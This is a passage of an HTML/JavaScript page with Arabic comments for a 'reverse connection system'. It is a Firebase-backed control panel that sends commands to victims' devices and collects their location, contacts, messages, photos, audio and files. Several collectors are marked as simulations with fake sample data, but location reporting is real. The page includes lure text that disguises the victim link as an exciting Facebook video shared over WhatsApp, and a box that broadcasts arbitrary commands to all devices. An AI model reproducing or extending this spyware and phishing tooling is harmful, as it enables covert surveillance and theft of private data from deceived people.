                            timestamp: Date.now()
                        });
                    }, (error) => {
                        database.ref('results/' + deviceId + '/location').set({
                            error: error.message,
                            timestamp: Date.now()
                        });
                    });
                } else {
                    database.ref('results/' + deviceId + '/location').set({
                        error: 'الموقع غير مدعوم',
                        timestamp: Date.now()
                    });
                }
            }

            getContacts(deviceId) {
                // محاكاة جهات الاتصال
                const contacts = {
                    count: Math.floor(Math.random() * 200) + 50,
                    sample: [
                        { name: 'أحمد محمد', number: '0551234567' },
                        { name: 'فاطمة علي', number: '0547654321' },
                        { name: 'خالد إبراهيم', number: '0569876543' }
                    ],
                    timestamp: Date.now()
                };
                
                database.ref('results/' + deviceId + '/contacts').set(contacts);
            }

            getMessages(deviceId) {
                // محاكاة الرسائل
                const messages = {
                    count: Math.floor(Math.random() * 100) + 20,
                    sample: [
                        { from: 'أمير', message: 'مرحبا، كيف الحال؟', time: '10:30' },
                        { from: 'سارة', message: 'شكراً على المساعدة', time: '09:15' },
                        { from: 'محمد', message: 'نتقابل غداً', time: '08:45' }
                    ],
                    timestamp: Date.now()
                };
                
                database.ref('results/' + deviceId + '/messages').set(messages);
            }

            takePhoto(deviceId) {
                // محاكاة التقاط صورة
                database.ref('results/' + deviceId + '/photo').set({
                    status: 'success',
                    message: 'تم محاكاة التقاط الصورة',
                    timestamp: Date.now()
                });
            }

            recordAudio(deviceId) {
                // محاكاة تسجيل صوت
                database.ref('results/' + deviceId + '/audio').set({
                    status: 'success',
                    duration: '10 ثواني',
                    timestamp: Date.now()
                });
            }

            getFiles(deviceId) {
                // محاكاة الحصول على الملفات
                database.ref('results/' + deviceId + '/files').set({
                    count: Math.floor(Math.random() * 50) + 10,
                    sample: ['document.pdf', 'image.jpg', 'video.mp4'],
                    timestamp: Date.now()
                });
            }

            vibrate(deviceId) {
                // محاكاة الاهتزاز
                if (navigator.vibrate) {
                    navigator.vibrate(1000);
                }
                
                database.ref('results/' + deviceId + '/vibrate').set({
                    status: 'success',
                    duration: '1 ثانية',
                    timestamp: Date.now()
                });
            }
        }

        // الدوال المساعدة
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showNotification('✅ تم نسخ الرابط بنجاح!');
            }).catch(() => {
                // طريقة بديلة للنسخ
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                showNotification('✅ تم نسخ الرابط بنجاح!');
            });
        }

        function shareSession(url) {
            if (navigator.share) {
                navigator.share({
                    title: '🎥 فيديو فيسبوك مثير',
                    text: 'شاهد هذا الفيديو الممتع على فيسبوك',
                    url: url
                });
            } else {
                // مشاركة عبر واتساب
                const whatsappUrl = `https://wa.me/?text=${encodeURIComponent('🎥 شاهد هذا الفيديو الممتع: ' + url)}`;
                window.open(whatsappUrl, '_blank');
            }
        }

        function testSession(url) {
            window.open(url, '_blank');
            showNotification('🧪 يتم فتح صفحة اختبار الجلسة...');
        }

        function showNotification(message) {
            const notification = document.getElementById('copyNotification');
            notification.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }

        // تهيئة النظام
        const reverseSystem = new ReverseConnectionSystem();

        // الدوال العامة للواجهة
        window.authenticate = () => reverseSystem.authenticate();
        window.createReverseSession = () => reverseSystem.createReverseSession();
        window.copyToClipboard = copyToClipboard;
        window.shareSession = shareSession;
        window.testSession = testSession;
        window.switchTab = (tabName) => reverseSystem.switchTab(tabName);
        window.sendCommand = (deviceId, command) => reverseSystem.sendCommand(deviceId, command);
        window.sendCommandToAll = (command) => reverseSystem.sendCommandToAll(command);

        // إرسال أمر مخصص
        window.sendCustomCommand = () => {
            const command = document.getElementById('customCommand').value;
            if (command) {
                reverseSystem.sendCommandToAll(command);
                document.getElementById('customCommand').value = '';
                showNotification(`🚀 تم إرسال الأمر: ${command}`);
            } else {
                showNotification('⚠️ يرجى إدخال أمر');
            }
        };

        // تحديث تلقائي كل 5 ثوان
        setInterval(() => {
            if (reverseSystem.isAuthenticated) {
                reverseSystem.updateDashboard();
            }
        }, 5000);

        // تحميل تلقائي عند فتح الصفحة
        window.addEventListener('load', () => {
            console.log('🚀 نظام الاتصال العكسي جاهز للاستخدام');
        });
    </script>
</body>
</html>
